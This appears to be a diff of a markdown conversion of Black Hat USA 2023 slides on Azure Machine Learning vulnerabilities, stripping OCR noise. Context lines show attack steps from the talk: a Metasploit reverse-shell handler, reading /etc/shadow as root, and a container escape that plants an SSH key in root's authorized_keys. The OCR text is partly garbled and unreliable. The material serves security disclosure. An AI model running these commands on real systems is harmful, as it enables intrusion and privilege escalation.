@@ -21,7 +21,6 @@ converted_at: "2026-08-11T21:23:12Z"
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Nitesh Surana & Magno Logan & David Fiser_Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities.pdf` (98 pages)
 
-
 ## Slide 1
 
 ### Uncovering Azure's Silent Threats: A Journey into Cloud Vulnerabilities
@@ -172,8 +171,6 @@ Accessing Workspace using AML Studio (https://ml.azure.com/)
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-Rg re EE Ns: Es
-=) 1G O 8 = https://mlazure.com/?wsid=/subscriptions, /resourceGroups/ns-rg/providers/Microsoft.Machine 110% YY 0 @ - A © Fy =
 si 5 research_tenant 2,
 Azure Al | Machine Learning Studio © a 8 a ? © zi = Vv Or
 lema ,
@@ -669,7 +666,6 @@ Authoring ae a “eo = => demo > Notebooks
 =| Notebooks _
 [] 1:mybox x
 fe Automated ML
-= i “4
 sa Designer —_ =? &
 » .
 Assets azureuser@mybox:~S whoami
@@ -1395,9 +1391,6 @@ Requirement .parse(‘pillow>=7.1.0'), {‘bokeh'})
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-QO ‘ x"
-@ QS \ —
-. y Zz os
 blackhat Command logged in Service Log
 USA 20e53
 3 USER=root ; COMMAND=/usr/bin/cat /etc/shadow
@@ -1664,7 +1657,6 @@ sleep 30
 reverse
 #y
 The command wall run from the reot of the uploaded code folder. Add any parameters and input references as needed.
-@ ns@kali:~ X ane ahd rh ee 0 x
 msf6 exploit(multi/handler) > run Serving HTTP on 8.9.8.8 port 8986 (http://68.6.6.9:8880/ |
 Paar
 {*] Started reverse TCP handler on 6.6.8.8:8686 26.239.36.32 - - [15/Nov/2622 86:47:36] "GET /reverse H
@@ -1704,7 +1696,6 @@ root 1 8.0 98.4 224672 17048
 root 11 6.0 6.0 3176
 root 18 08.0 86.0 2476
 root 20 98.0 86.0 6752
-wv wv ow ow
 STAT START
 Ssl
 Ss
@@ -1748,7 +1739,6 @@ chroot /hostOS
 ssh-keygen -N "" -f /tmp/test
 cat /tmp/test.pub > /root/.ssh/authorized_ keys
 ssh -oStrictHostKeyChecking=no -oBatchMode=yes -i /tmp/test root@127.0.0.1
-a nm WwW BP WwW NH Fe
 Credits: Docker API Honeypots + Percussive Elbow’s docker-escape-tool
 #BHUSA @BlackHatEvents
 ```
@@ -2124,7 +2114,6 @@ Effect
 
 ```text
 : Fs Foe N/a ee
-& AP ae (Se
 > al
 USA 20e53
 Compromised PyTorch Dependency
